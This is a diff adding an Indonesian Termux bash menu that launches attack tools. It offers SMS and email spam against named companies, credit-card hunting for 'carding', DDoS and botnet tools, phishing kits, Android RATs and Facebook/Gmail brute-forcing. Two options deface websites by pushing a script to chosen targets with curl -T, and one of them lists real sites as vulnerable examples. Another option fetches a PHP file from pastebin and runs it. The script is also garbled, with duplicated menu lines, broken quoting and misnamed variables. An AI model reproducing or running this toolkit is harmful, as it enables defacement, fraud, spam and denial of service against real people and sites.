+echo $green "134.> Install 1337Rat "
+echo "[===============================================]>"
+echo $red "135.> Install Universal Fedora Chroot Tool"
+echo "[===============================================]>"
+echo $white "136.> Install Knock Subdomain Scan  "
+echo "[===============================================]>"
+echo $purple "137.> Install  OWASP-vbscan"
+echo "[===============================================]>"
+echo $yellow "138.> Install Dracnmap"
+echo "[===============================================]>"
+echo $cyan "139.> Install Tool Brutal "
+echo "[===============================================]>"
+echo $red "140.> Install BruteSploit "
+echo "[===============================================]>"
+echo $yellow "141.> Install Microsploit"
+echo "[===============================================]>"
+echo $green "142.> Install Vegile"
+echo "[===============================================]>"
+echo $white "143.> Install PhEmail"
+echo "[===============================================]>"
+echo $blue "144.> Install reposcanner"
+echo "[===============================================]>"
+
+#!/system/xbin/bash
+#MauNgapainGblk?
+#DiRecodeGakBakalJadiinLuMastah
+#DiGantiAuthorGakBakalJadiinLuMaster
+#MikirMakeOtakGblk
+#KontolKaloMauReedit/Recode 
+#Pm Gua Bangsat
+clear
+cd module
+python2 please.py
+blue='\033[34;1m'
+green='\033[32;1m'  
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'                                           
+yellow='\033[33;1m'
+sleep 1
+echo $red
+cat asw.txt
+echo ""
+echo "\033[34;1m[$]\033[36;1m============================\033[34;1m[$]"
+echo "\033[32;1mAuthor : Mr.B4J1NAN KIRIK"
+echo "\033[37;1mFeat: Mr.LUKAMAN"
+echo "\033[35;1mversion Tools: 6"
+echo "\033[35;1mTeam : LUKMAN Is Me Lod Is me"
+echo "\033[33;1mKontak Me :  088806187431"
+echo "\033[31;1mPlease For Subcribe Youtube. https://m.youtube.com/channel/UCFIOXdX7P0uyqjS7Bvz4HUg :"
+echo "\033[92mDarkness Cyber Team Kejahan adalah kami!!" 
+echo "\033[36;1mIndonesia Security Lite"
+echo "\033[34;1m[$]\033[36;1m============================\033[34;1m[$]"
+echo ""
+echo "\033[32;1m SIHLAKAN YANG KALIAN MAU PAKE :LUKAMAN HECK:)?:"
+echo "\033[36;1m"
+echo "[===============================================[>"
+echo $green "1.> Spam Sms Tokopedia"
+echo "[===============================================]>"
+echo $purple "2.> Spam Sms Telkomnyet"
+echo "[===============================================]>"
+echo $cyan "3.> Spam Sms Matahari Mall"
+echo "[===============================================]>"
+echo $red "4.> Spam Sms HooqTV"
+echo "[===============================================]>"
+echo $white "5.> Spam Sms KFC"
+echo "[===============================================]>"
+echo $green "6.> Spam Sms PHD"
+echo "[===============================================]>"
+echo $purple "7.> Spam Sms Whiskas"
+echo "[===============================================]>"
+echo $cyan "8.> Spam Sms ZiPAY"
+echo "[===============================================]>"
+echo $red "9.> Nyari CC buat Carding"
+echo "[===============================================]>"
+echo $white "10.> Spam Akun Gmail"
+echo "[===============================================]>"
+echo $green "11.> Whois LookUp"
+echo "[===============================================]>"
+echo $purple "12.> Upload Admin Finder"
+echo "[===============================================]>"
+echo $cyan "13.> Script Deface Creator"
+echo "[===============================================]>"
+echo $red "14.> ReConDog Buat Information gathering"
+echo "[===============================================]>"
+echo $white "15.> Admin Login Finder"
+echo "[===============================================]>"
+echo $green "16.> Virus VbugMaker Creator"
+echo "[===============================================]>"
+echo $purple "17.> dowload script deface orang"
+echo "[===============================================]>"
+echo $cyan "18.> Autolike Facebook"
+echo "[===============================================]>"
+echo $red "19.> Facebook Auto_Reaction"
+echo "[===============================================]>"
+echo $white "20.> Bot Komentar Facebook"
+echo "[===============================================]>"
+echo $green "21.> Install txtool"
+echo "[===============================================]>"
+echo $purple "22.> install sqlscan"
+echo "[===============================================]>"
+echo $cyan "23.> install hash-buster"
+echo "[===============================================]>"
+echo $red "24.> Install Red_Hawk"
+echo "[===============================================]>"
+echo $white "25.> Install Torshammer buat DDOS website"
+echo "[===============================================]>"
+echo $green "26.> Install LITEDDOS buat DDOS website"
+echo "[===============================================]>"
+echo $purple "27.> Install Hunner Framework"
+echo "[===============================================]>"
+echo $cyan "28.> Install Sqlmap Buat Inject Situs"
+echo "[===============================================]>"
+echo $red "29.> Install 4wsectools"
+echo "[===============================================]>"
+echo $white "30.> Install Lazymux Buat Install Tools"
+echo "[===============================================]>"
+echo $green "31.> Mempercepat / Menstabilkan Jaringan/sinyal"
+echo "[===============================================]>"
+echo $purple "32.> Mempercepat / menstabilkan jaringan 2"
+echo "[===============================================]>"
+echo $cyan "33.> Install BinGoo"
+echo "[===============================================]>"
+echo $red "34.> Full Bot Facebook"
+echo "[===============================================]>"
+echo $white "35.> Install Termux-A"
+echo "[===============================================]>"
+echo $green "36.> Install Tools GadoGado"
+echo "[===============================================]>"
+echo $purple "37.> Install Lazysqlmap"
+echo "[===============================================]>"
+echo $cyan "38.> Install tools diejoubu"
+echo "[===============================================]>"
+echo $red "39.> Install weeman Buat Phising"
+echo "[===============================================]>"
+echo $white "40.> Install iesDEFACE buat Deface Poc Webdav"
+echo "[===============================================]>"
+echo $green "41.> install errorcybertools"
+echo "[===============================================]>"
+echo $purple "42.> install A-Rat untuk Retas Android"
+echo "[===============================================]>"
+echo $cyan "43.> Scan-Website-Admin-Login"
+echo "[===============================================]>"
+echo $red "44.> DEFACE metode Webdav"
+echo "[===============================================]>"
+echo $white "45.> Tools Katoolin"
+echo "[===============================================]>"
+echo $green "46.> Main Tebak2 kan:v biar ga bt:v"
+echo "[===============================================]>"
+echo $purple "47.> Brute DEFACE webdav"
+echo "[===============================================]>"
+echo $cyan "48.> Browsing Di Termux"
+echo "[===============================================]>"
+echo $red "49.> Dengerin Lagu Youtube di Termux"
+echo "[===============================================]>"
+echo $white "50.> Tebak Tebak Kan Soal Cinta Tod" 
+echo "[===============================================]>"
+echo $green "51.> Nuyul Bitcoin"
+echo "[===============================================]>"
+echo $purple "52.> Install MetaSploit"
+echo "[===============================================]>"
+echo $cyan "53.> MultiBrute Force Facebook Buat Hack Facebook"
+echo "[===============================================]>"
+echo $red "54.> install WAScan"
+echo "[===============================================]>"
+echo $white "55.> install MultiSpam [Sms]"
+echo "[===============================================]>"
+echo $green "56.> Spam Sms Jd.id"
+echo "[===============================================]>"
+echo $purple "57.> DDOS xerxes"
+echo "[===============================================]>"
+echo $cyan "58.> IPGeoLocation Buat Lacak IP"
+echo "[===============================================]>"
+echo $red "59.> Install viSQL"
+echo "[===============================================]>"
+echo $white "60.> Install Kawai-Botnet Buat DDOS"
+echo "[===============================================]>"
+echo $green "61.> Install OWScan"
+echo "[===============================================]>"
+echo $purple "62.> Install AstraNmap"
+echo "[===============================================]>"
+echo $cyan "63.> Install Auxscan2.0"
+echo "[===============================================]>"
+echo $red "64.> Install Black-Hydra"
+echo "[===============================================]>"
+echo $white "65.> Install Ipddos"
+echo "[===============================================]>"
+echo $green "66.> Install hasher"
+echo "[===============================================]>"
+echo $purple "67.> Install PhisingGame Buat Hack ML & COC"
+echo "[===============================================]>"
+echo $cyan "68.> Kumpulan Tutorial Termux"
+echo "[===============================================]>"
+echo $red "69.> Chating Di Termux"
+echo "[===============================================]>"
+echo $white "70.> Cari Panel Login Admin Pakai Breacer"
+echo "[===============================================]>"
+echo $green "71.> Install SocialFish Buat Phising"
+echo "[===============================================]>"
+echo $purple "72.> Install MoonBuggy Buat Main Game"
+echo "[===============================================]>"
+echo $cyan "73.> Install Cupp Buat Worldlist Tertarget"
+echo "[===============================================]>"
+echo $red "74.> Install Hydra"
+echo "[===============================================]>"
+echo $white "75.> Install md5-crack"
+echo "[===============================================]>"
+echo $green "76.> Install LITESPAM Buat Spam"
+echo "[===============================================]>"
+echo $purple "77.> Mulung Bitcoin"
+echo "[===============================================]>"
+echo $cyan "78.> Install Ko-Dork"
+echo "[===============================================]>"
+echo $red "79.> Lihat Spesifikasi Ponsel"
+echo "[===============================================]>"
+echo $white "80.> install lhst"
+echo "[===============================================]>"
+echo $green "81.> Install The Fat Rat"
+echo "[===============================================]>"
+echo $purple "82.> Install CMSmap"
+echo "[===============================================]>"
+echo $cyan "83.> Install Kali Ubuntu"
+echo "[===============================================]>"
+echo $red "84.> Install Ngrok"
+echo "[===============================================]>"
+echo $white "85.> Install Brute Force Gmail"
+echo "[===============================================]>"
+echo $green "86.> Install Lokomedia Exploiters"
+echo "[===============================================]>"
+echo $purple "87.> Install Kali Linux Nethunter"
+echo "[===============================================]>"
+echo $cyan "88.> Install joomscan"
+echo "[===============================================]>"
+echo $red "89.> Install VulnScaner"
+echo "[===============================================]>"
+echo $white "90.> Install HN-Installer"
+echo "[===============================================]>"
+echo $green "91.> Install Fucking-Rat"
+echo "[===============================================]>"
+echo $cyan "92.> Install linux fedora"
+echo "[===============================================]>"
+echo $red "93.> Install information Gathering"
+echo "[===============================================]>"
+echo $blue "94.> Install ezsploit [Harus Root]"
+echo "[===============================================]>"
+echo $white "95.> Install Dirsearch "
+echo "[===============================================]>"
+echo $red "96.> Install honeypot"
+echo "[===============================================]>"
+echo $cyan "97.> Install Killr"
+echo "[===============================================]>"
+echo $blue "98.> Install Human_Level_Control"
+echo "[===============================================]>"
+echo $green "99.> Install Termux-Mpv"
+echo "[===============================================]>"
+echo $purple "100.> Install OWASP-Nettacker"
+echo "[===============================================]>"
+echo $white "101.> Install OWASP-ZSC"
+echo "[===============================================]>"
+echo $red "102.> Install InfoGa"
+echo "[===============================================]>"
+echo $green "103.> Install cok-rat"
+echo "[===============================================]>"
+echo $blue "104.> Install hash-Generator"
+echo "[===============================================]>"
+echo $cyan "105.> Install Open Source Information Facebook"
+echo "[===============================================]>"
+echo $yellow "106.> Install str2bf"
+echo "[===============================================]>"
+echo $purple "107.> Install BForce"
+echo "[===============================================]>"
+echo $red "108.> Install Web Application Audit Framework"
+echo "[===============================================]>"
+echo $green "109.> Install SMBrute"
+echo "[===============================================]>"
+echo $white "110.> Install Wordpress Security Scanner"
+echo "[===============================================]>"
+echo $blue "111.> Install hmap (fingerprinting web servers)"
+echo "[===============================================]>"
+echo $yellow "112.> Install Auto Report Facebook"
+echo "[===============================================]>"
+echo $purple "113.> Install dhcpdorf"
+echo "[===============================================]>"
+echo $green "114.> Install deskcon-desktop"
+echo "[===============================================]>"
+echo $white "115.> Install Tools suRAT-Cinta"
+echo "[===============================================]>"
+echo $blue  "116.> Install Tools m4ngARP"
+echo "[===============================================]>"
+echo $cyan "117.> Install Tools WP-Hunter"
+echo "[===============================================]>"
+echo $red "118.> Install Remote-Shell"
+echo "[===============================================]>"
+echo $purple "119.> Install LITESCRIPT "
+echo "[===============================================]>"
+echo $green "120.> Install meTAInstall"
+echo "[===============================================]>"
+echo $white "121.> Install Zilcorili (Security Framework) "
+echo "[===============================================]>"
+echo $blue "122.> Install AutoScriptKiddiesTool "
+echo "[===============================================]>"
+echo $yellow "123.> Install bot-exploiters"
+echo "[===============================================]>"
+echo $purple "124.> Install Termux-metasploit [work] "
+echo "[===============================================]>"
+echo $red "125.> Install Instagram Bot"
+echo "[===============================================]>"
+echo $green "126.> Install FesbukBrute"
+echo "[===============================================]>"
+echo $white "127.> Install Email-Harvester"
+echo "[===============================================]>"
+echo $blue "128.> Install Gdog Backdoor Using Gmail"
+echo "[===============================================]>"
+echo $yellow "129.> Install Penetration Testing Engagements"
+echo "[===============================================]>"
+echo $purple "130.> Install CanisRufus"
+echo "[===============================================]>"
+echo $red "131.> Install EttercapForAndroid"
+echo "[===============================================]>"
+echo $blue "132.> Install  BlackNmap"
+echo "[===============================================]>"
+echo $white "133.> Install NMapForAndroid"
+echo "[===============================================]>"
+echo $green "134.> Install 1337Rat "
+echo "[===============================================]>"
+echo $red "135.> Install Universal Fedora Chroot Tool"
+echo "[===============================================]>"
+echo $white "136.> Install Knock Subdomain Scan  "
+echo "[===============================================]>"
+echo $purple "137.> Install  OWASP-vbscan"
+echo "[===============================================]>"
+echo $yellow "138.> Install Dracnmap"
+echo "[===============================================]>"
+echo $cyan "139.> Install Tool Brutal "
+echo "[===============================================]>"
+echo $red "140.> Install BruteSploit "
+echo "[===============================================]>"
+echo $yellow "141.> Install Microsploit"
+echo "[===============================================]>"
+echo $green "142.> Install Vegile"
+echo "[===============================================]>"
+echo $white "143.> Install PhEmail"
+echo "[===============================================]>"
+echo $blue "144.> Install reposcanner"
+echo "[===============================================]>"
+echo $red "145.> Install search drives for credit card numbers "
+echo "[===============================================]>"
+echo $cyan "146.> Install zambie"
+echo "[===============================================]>"
+echo $purple "147.> Install TrackUrl"
+echo "[===============================================]>"
+echo $yellow "148.> Install DataSploit "
+echo "[===============================================]>"
+echo $red "149.> Install E-Bomber"
+echo "[===============================================]>"
+echo $blue "150.> Install IP-Locator"
+echo "[===============================================]>"
+echo $white "151.> Install Admin Finder Blazing Fast "
+echo "[===============================================]>"
+echo $cyan "152.> Install pynmap"
+echo "[===============================================]>"
+echo $white "153.> Install sqli-scanner"
+echo "[===============================================]>"
+echo $yellow  "154.> Install port-lookup"
+echo "[===============================================]>"
+echo $purple "155.> Install tic-tac-toe"
+echo "[===============================================]>"
+echo $red "156.> Install folderlocker"
+echo "[===============================================]>"
+echo $cyan "157.> Install xerosploit"
+echo "[===============================================]>"
+echo $green "158.> Install Wifresti (Wifi-Password Recovery tool)"
+echo "[===============================================]>"
+echo $white "159.> Install TheFuck "
+echo "[===============================================]>"
+echo $yellow "160.> Install sqliv"
+echo "[===============================================]>"
+echo $blue "161.> Install Linux Local Root Exploiters"
+echo "[===============================================]>"
+echo $white "162.> Install BlackMail"
+echo "[===============================================]>"
+echo $red "163.> Install BlackTrack"
+echo "[===============================================]>"
+echo $cyan "164.> Install HashCode "
+echo "[===============================================]>"
+echo $green "165.> Install  Dec-Enc-Hash"
+echo "[===============================================]>"
+echo $blue "166.> Install hostchecker"
+echo "[===============================================]>"
+echo $red "167.> Install myenc (encrypt script python)"
+echo "[===============================================]>"
+echo $white "168.> Install StartPhp"
+echo "[===============================================]>"
+echo $cyan "169.> Install Facenotify (Facebook Notify Review) "
+echo "[===============================================]>"
+echo $purple "170.> Install notefast (notepad for linux"
+echo "[===============================================]>"
+echo $cyan "171.> Install server_domains"
+echo "[===============================================]>"
+echo $red "172.> Install Tool-Kit"
+echo "[===============================================]>"
+echo $yellow "173.> Install MyServer"
+echo "[===============================================]>"
+echo $blue  "174.> Install  recon-ng_termux_by_viral"
+echo "[===============================================]>"
+echo $white "175.> Install Metasploit_For_Termux"
+echo "[===============================================]>"
+echo $red "176.> Install Setoolkit-for-termux "
+echo "[===============================================]>"
+echo "\033[32;1m"
+read -p "root@T00Ls-LUKMAN TAMPAN~#" bro
+
+if [ $bro = 1 ] || [ $bro = 1 ]
+then
+clear
+figlet "Mr.LUKMAN TAMPAN" | lolcat
+php tp.php
+fi
+
+if
+[ $bro = 2 ] || [ $bro = 2 ]
+then
+clear
+toilet "Mr.LUKMAN TAMPAN"
+php t.php
+fi
+
+if [ $bro = 3 ] || [ $bro = 3 ]
+then
+figlet "Mr.LUKMAN TAMPAN"
+php mataharimall.php
+fi
+
+if [ $bro = 4 ] || [ $bro = 4 ]
+then
+clear
+toilet "Mr.LUKMAN TAMPAN"
+php hooq.php
+fi
+
+if [ $bro = 5 ] || [ $bro = 5 ]
+then
+clear
+toilet -f slant --gay "Mr.LUKMAN TAMPAN"
+php kfc.php
+fi
+
+if [ $bro = 6 ] || [ $bro = 6 ]
+then
+clear
+toilet -f mono12 -F gay "Mr.LUKMAN TAMPAN"
+php phd.php
+fi
+
+if [ $bro = 7 ] || [ $bro = 7 ]
+then
+clear
+toilet "Mr.LUKMAN TAMPAN"
+php whiskas.php
+fi
+
+if [ $bro = 8 ] || [ $bro = 8 ]
+then
+clear
+figlet "Mr.LUKMAN TAMPAN"
+php zipay.php
+fi
+
+if [ $bro = 9 ] || [ $bro = 9 ]
+then
+clear
+toilet  "Mr.LUKMAN TAMPAN"
+php key.php
+fi
+
+if [ $bro = 10 ] || [ $bro = 10 ]
+then
+clear
+toilet "Mr.LUKMAN TAMPAN"
+python2 SpamMail.py
+fi
+
+if [ $bro = 11 ] || [ $bro = 11 ]
+then
+clear
+toilet "Mr.LUKMAN TAMPAN"
+python2 whs.py
+fi
+
+if [ $bro = 12 ] || [ $bro = 12 ]
+then
+clear
+toilet "Mr.LUKMAN TAMPAN"
+python2 upf.py
+fiif [ $bro = 13 ] || [ $bro = 13 ]
+then
+clear
+toilet "Mr.LUKMAN TAMPAN"
+python2 create.py
+fi
+
+if [ $bro = 14 ] || [ $bro = 14 ]
+then
+clear
+toilet "Mr.LUKMAN TAMPAN"
+python2 dog.py
+fi
+
+if [ $bro = 15 ] || [ $bro = 15 ]
+then
+clear
+toilet "Mr.LUKMAN TAMPAN"
+python2 gam.py
+fi
+
+if [ $bro = 16 ] || [ $bro = 16 ]
+then
+clear
+toilet "Mr.LUKMAN TAMPAN"
+python2 anvima.py
+fi
+
+if [ $bro = 17 ] || [ $bro = 17 ]
+then
+clear
+toilet "Mr.LUKMAN TAMPAN"
+python2 htmd.py
+fi
+
+if [ $bro = 18 ] || [ $bro = 18 ]
+then
+clear
+toilet "Mr.LUKMAN TAMPAN"
+php autolike.php
+fi
+
+if [ $bro = 19 ] || [ $bro = 19 ]
+then
+clear
+toilet "Mr.LUKMAN TAMPAN"
+python2 auto_reaction.py
+fi
+
+if [ $bro = 20 ] || [ bro = 20 ]
+then
+clear
+figlet "Mr.LUKMAN TAMPAN"" | lolcat
+python2 botkomen.py
+fi
+
+if [ $bro = 21 ] || [ $bro = 21 ]
+then
+clear
+figlet "Mr.LUKMAN TAMPAN"" | lolcat
+git clone https://github.com/kuburan/txtool
+mv txtool $HOME
+cd $HOME/txtool
+python2 install.py
+python2 update.py
+txtool
+fi
+
+
+if [ $bro = 22 ] || [ bro = 22 ]
+then
+clear
+toilet -f slant -F gay "Mr.LUKMAN TAMPAN"" 
+pkg install update && pkg install upgrade
+pkg install git
+pkg install php
+cd module
+php sqlscan.php
+fi
+
+if [ $bro = 23 ] || [ $bro = 23 ]
+then
+clear
+toilet -f mono12 -F gay "" Mr.LUKMAN TAMPAN"
+apt upgrade
+apt install python2
+apt install git
+git clone https://github.com/UltimateHackers/Hash-Buster
+mv Hash-Buster $HOME
+cd $HOME/Hash-Buster
+python2 hash.py
+fi
+
+if [ $bro = 24 ] || [ $bro = 24 ]
+then
+clear
+toilet -f standard -F gay "Mr.LUKMAN TAMPAN"" 
+echo "\033[33;1muntuk tutorial kunjungi:" "\033[36;1m https://youtu.be/h2I5HU3W-so"
+sleep 3
+apt update
+apt install git
+apt install php
+git clone https://github.com/Tuhinshubhra/RED_HAWK
+mv RED_HAWK $HOME
+cd $HOME/RED_HAWK
+chmod +x rhawk.php
+php rhawk.php
+fi
+
+if [ $bro = 25 ] || [ $bro = 25 ]
+then
+clear
+toilet -f standard -F gay "Mr.LUKMAN TAMPAN"" 
+apt update
+apt install git
+apt install tor
+git clone https://github.com/dotfighter/torshammer.git
+mv torshammer $HOME
+cd $HOME/torshammer
+read -p "Masukan Target==>:" target
+python2 torshammer.py -T -t target
+fi
+
+if [ $bro = 26 ] || [ $bro = 26 ]
+then
+clear
+toilet -f standard -F gay ""Mr.LUKMAN TAMPAN" 
+echo "\033[33;1muntuk tutorial kunjungi:" "\033[36;1m https://youtu.be/EskgepQSB7U"
+sleep 3
+apt update
+apt install git
+git clone https://github.com/4L13199/LITEDDOS
+mv LITEDDOS $HOME
+cd $HOME/LITEDDOS
+read -p "MasukanTarget:" target
+python2 LITEDDOS.py target 80 100
+fi
+
+if [ $bro = 27  || [ $bro = 27 ]
+then
+clear
+toilet -f standard -F gay ""Mr.LUKMAN TAMPAN" 
+apt update
+apt install git
+git clone https://github.com/b3-v3r/Hunner.git
+mv Hunner $HOME
+cd $HOME/Hunner
+chmod +x hunner.py
+python2 hunner.py
+fi
+
+if [ $bro = 28 ] || [ $bro = 28 ]
+then
+clear
+toilet -f standard -F gay "Mr.LUKMAN TAMPAN"
+apt update
+apt install git
+git clone https://github.com/sqlmapproject/sqlmap
+mv sqlmap $HOME
+cd $HOME/sqlmap
+read -p "masukan web target:" target
+python2 sqlmap.py -D target
+fi
+
+if [ $bro = 29 ] || [ $bro = 29 ]
+then
+clear
+toilet -f standard -F gay "Mr.LUKMAN TAMPAN"
+apt update
+apt install git
+git clone https://github.com/aryanrtm/4wsectools
+mv 4wsectools $HOME
+cd $HOME/4wsectools
+chmod 777 tools
+./tools
+fi
+
+if [ $bro = 30 ] || [ $bro = 30 ]
+then
+clear
+figlet "Mr.B4J1N64N" | lolcat
+apt update && upgrade
+apt install python2 
+apt install git
+cd module
+python2 lazymux.py
+fi
+if [ $bro = 31 ] || [ $bro = 31 ]
+then
+clear
+figlet " Mr.LUKMAN TAMPAN"| lolcat
+sleep 1
+echo "\033[32;m====================Mempercepat / menstabilkan sinyal===================="
+sleep 1
+echo "\033[32;1m================================By Mr.LUKMAN TAMPAN"================================"
+sleep 1
+echo ""
+echo ""
+ping 8.8.8.8 
+fi
+
+if [ $bro = 32 ] || [ $bro = 32 ]
+then
+clear
+figlet "Mr.B4J1N64N" | lolcat
+sleep 1
+echo "\033[32;m===================Mempercepat / menstabilkan sinyal 2===================="
+sleep 1
+echo "\033[32;1m================================By Mr.LUKMAN TAMPAN"================================"
+sleep 1
+echo ""
+echo ""
+ping -D www.google.com
+fi
+
+if [ $bro = 33 ] || [ $bro = 33 ]
+then
+clear
+figlet " Mr.LUKMAN TAMPAN"
+| lolcat
+sleep 1
+git clone https://github.com/Hood3dRob1n/BinGoo
+mv BinGoo $HOME
+cd $HOME/BinGoo
+bash bingoo
+fi
+
+if [ $bro = 34 ] || [ $bro = 34 ]
+then
+clear
+figlet "Mr.LUKMAN TAMPAN" | lolcat
+sleep 1
+cd module
+python2 facebook.py
+fi
+
+if [ $bro = 35 ] || [ $bro = 35 ]
+then
+clear
+figlet "Mr.LUKMAN TAMPAN" | lolcat
+sleep 1
+apt update && apt upgrade
+apt install termux-api
+apt install git
+apt install php
+git clone https://github.com/Cvar1984/Termux-A.git
+mv Termux-A $HOME
+cd $HOME/Termux-A
+php run.php
+fi
+
+if [ $bro = 36 ] || [ $bro = 36 ]
+then
+clear
+figlet "Mr.LUKMAN TAMPAN" | lolcat
+sleep 1
+apt update && apt upgrade
+apt install ruby
+apt install lolcat
+apt install git
+git clone https://github.com/Senitopeng/GadoGado.git
+mv GadoGado $HOME
+cd $HOME/GadoGado
+bash gado
+fi
+
+if [ $bro = 37 ] || [ $bro = 37 ]
+then
+clear
+figlet "Mr.B4J1N64N" | lolcat
+sleep 1
+apt update && apt upgrade
+apt install python2
+apt install git
+git clone https://github.com/verluchie/termux-lazysqlmap.git
+mv termux-lazysqlmap $HOME
+cd $HOME/termux-lazysqlmap
+chmod 777 install.sh
+./install.sh
+lazysqlmap
+fi
+
+if [ $bro = 38 ] || [ $bro = 38 ]
+then
+clear
+figlet "Mr.B4J1N64N" | lolcat
+sleep 1 
+apt install git
+apt install php
+git clone https://github.com/alintamvanz/diejoubu
+mv diejoubu $HOME
+cd $HOME/diejoubu
+cd v1.2
+php diejoubu.php
+fi
+
+if [ $bro = 39 ] || [ $bro = 39 ]
+then
+clear
+figlet "Mr.B4J1N64N" | lolcat
+sleep 1 
+apt install git
+apt install php
+git clone https://github.com/evait-security/weeman.git
+mv weeman $HOME
+cd $HOME/weeman
+python2 weeman.py
+fi
+
+if [ $bro = 40 ] || [ $bro = 40 ]
+then
+clear
+figlet " Mr.LUKMAN TAMPAN" | lolcat
+sleep 1 
+apt install git
+apt install bash
+pip2 install bash
+git clone https://github.com/ALX-04/iesDEFACE
+mv iesDEFACE $HOME
+cd $HOME/iesDEFACE
+bash iesDeface.sh
+fi
+if [ $bro = 41 ] || [ $bro = 41 ]
+then
+clear
+figlet " Mr.LUKMAN TAMPAN" | lolcat
+sleep 1
+git clone https://github.com/MrKeepSmile/errorcybertool.git
+mv errorcybertool $HOME
+cd $HOME/errorcybertool
+chmod 777 errorcyber
+./errorcyber
+fi
+
+if [ $bro = 42 ] || [ $bro = 42 ]
+then
+clear
+figlet "Mr.LUKMAN TAMPAN " | lolcat
+sleep 1
+git clone https://github.com/Xi4u7/A-Rat.git
+mv A-Rat $HOME
+cd $HOME/A-Rat
+python2 A-Rat.py
+fi
+
+if [ $bro = 43 ] || [ $bro = 43 ]
+then
+clear
+figlet "| lolcat
+sleep 1
+git clone https://github.com/DarknessCyberTeam/Scan-Website-Admin-Login
+mv Scan-Website-Admin-Login $HOME
+cd $HOME/Scan-Website-Admin-Login
+python2 Admin-Login.py
+fi
+
+if [ $bro = 44 ] || [ $bro = 44 ]
+then
+clear
+echo "\033[34;1m"
+cowsay -f kiss.cow " Mr.LUKMAN TAMPAN" | lolcat
+figlet -f slant Mr.LUKMAN TAMPAN
+echo "\033[37;1m"
+echo "Masukan Web target"
+echo "Contoh Web Target vuln"
+echo "	http://bestilling.udir.no/"
+echo "	http://560560.ru/"
+echo "	http://myownemailer.com/"
+echo "	http://Zoocentral.co.za/"
+echo "	http://50-50-50.ru/"
+echo "	http://tirupurjobs.net/"
+echo "	http://Matrimony.co.za/"
+echo "	http://Bheh.co.za/"
+read -p "[MrB4J1N64N]>" target
+echo "Masukan Nama script kalian"
+echo "yang ada di Luar Folder Ruang Penyimpanan"
+read -p "[MrB4J1N64N]>" script
+curl -T /storage/emulated/0/$script $target
+echo "\033[33;1m"
+echo "Selesai! Tod Cek di $target $script "
+fi
+
+if [ $bro = 45 ] || [ $bro = 45 ]
+then
+clear
+cowsay -f sheep.cow "Mr.LUKMAN TAMPAN" | lolcat
+figlet "Mr.LUKMAN TAMPAN" | lolcat
+sleep 1
+cd
+cd module
+python2 katoolin.py
+fi
+
+if [ $bro = 46 ] || [ $bro = 46 ]
+then
+clear
+cowsay -f kiss.cow "Mr.LUKMAN TAMPAN" | lolcat
+figlet "Mr.LUKMAN TAMPAN" | lolcat
+sleep 1
+cd module
+python2 r.py
+fi
+
+if [ $bro = 47 ] || [ $bro = 47 ]
+then
+clear
+toilet -f standard -F gay "BruteWebdav"
+echo "\033[32;1mauthor: Mr.B4J1N64N"
+echo "\033[33;1mTeam: Darkness Cyber Team"
+echo "\033[34;1mIndonesia Security Lite"
+echo "\033[32;1mJawaBarat Blackhat Army"
+echo "Masukan nama script"
+read -p "[=======>" script
+echo "\033[32;1m"
+echo "Masukan Web Target Ke1"
+read -p "[=======>" Ke1
+curl -T /storage/emulated/0/$script $Ke1
+echo "\033[32;1m" "Masukan Web Target Ke2 "
+read -p "[=======>" Ke2
+curl -T /storage/emulated/0/$script $Ke2
+echo "\033[32;1m" "Masukan Web Target Ke3"
+read -p "[=======>" Ke3
+curl -T /storage/emulated/0/$script $Ke3
+echo "\033[32;1m" "Masukan Web Target Ke4"
+read -p "[=======>" Ke4
+curl -T /storage/emulated/0/$script $Ke5
+echo "\033[32;1m" "Masukan Web Target Ke5"
+read -p "[=======>" Ke5
+curl -T /storage/emulated/0/$script $Ke5
+echo "\033[32;1m" "Masukan Web Target Ke6"
+read -p "[=======>" Ke6
+curl -T /storage/emulated/0/$script $Ke6
+echo "\033[32;1m" "Masukan Web Target Ke7"
+read -p "[=======>" Ke7
+curl -T /storage/emulated/0/$script $Ke7
+echo "\033[32;1m" "Masukan Web Target Ke8"
+read -p "[=======>" Ke8
+curl -T /storage/emulated/0/$script $Ke8
+echo "\033[32;1m" "Masukan Web Target Ke9"
+read -p "[=======>" Ke9
+curl -T /storage/emulated/0/$script $Ke9
+echo "\033[32;1m" "Masukan Web Target Ke10"
+read -p "[=======>" Ke10
+curl -T /storage/emulated/0/$script $Ke10
+sleep 1
+echo "[<=====================SEDANG PROSES KAWAN=====================>]"
+echo "Silahkan Cek Web $Ke1/$script"
+echo "Silahkan Cek Web $Ke2/$script"
+echo "Silahkan Cek Web $Ke3/$script"
+echo "Silahkan Cek Web $Ke4/$script"
+echo "Silahkan Cek Web $Ke5/$script"
+echo "Silahkan Cek Web $Ke6/$script"
+echo "Silahkan Cek Web $Ke7/$script"
+echo "Silahkan Cek Web $Ke8/$script"
+echo "Silahkan Cek Web $Ke9/$script"
+echo "Silahkan Cek Web $Ke10/$script"
+echo "[=============LUKMAN NURUL HAKIM=============]"
+fi
+
+if [ $bro = 48 ] || [ $bro = 48 ]
+then
+clear
+cowsay -f kiss.cow "|Mr.LUKMAN TAMPAN" lolcat
+figlet "Mr.LUKMAN TAMPAN" | lolcat
+sleep 1
+pkg install w3m
+w3m www.google.com
+fi
+
+if [ $bro = 49 ] || [ $bro = 49 ]
+then
+clear
+cowsay -f kiss.cow "Mr.LUKMAN TAMPAN" | lolcat
+figlet Mr.LUKMAN TAMPAN" | lolcat
+sleep 1
+apt update && apt upgrade
+apt install pip
+pkg install python
+pkg install python2
+pip install mps_youtube
+pip install youtube_dl
+pkg install mpv
+mpsyt
+fi
+
+if [ $bro = 50 ] || [ $bro = 50 ]
+then
+clear
+cowsay -f kiss.cow " Mr.LUKMAN TAMPAN"| lolcat
+figlet "Mr.B4J1N64N" | lolcat
+sleep 1
+cd module
+python2 cinta.py
+fi
+
+if [ $bro = 51 ] || [ $bro = 51 ]
+then
+clear
+cowsay -f kiss.cow "Mr.LUKMAN TAMPAN" | lolcat
+figlet "Mr.B4J1N64N" | lolcat
+sleep 1
+pkg install php
+pkg install wget
+wget -O tuyul.php https://pastebin.com/raw/3ERZV3nL
+mv tuyul.php $HOME
+php $HOME/tuyul.php
+fi
+
+
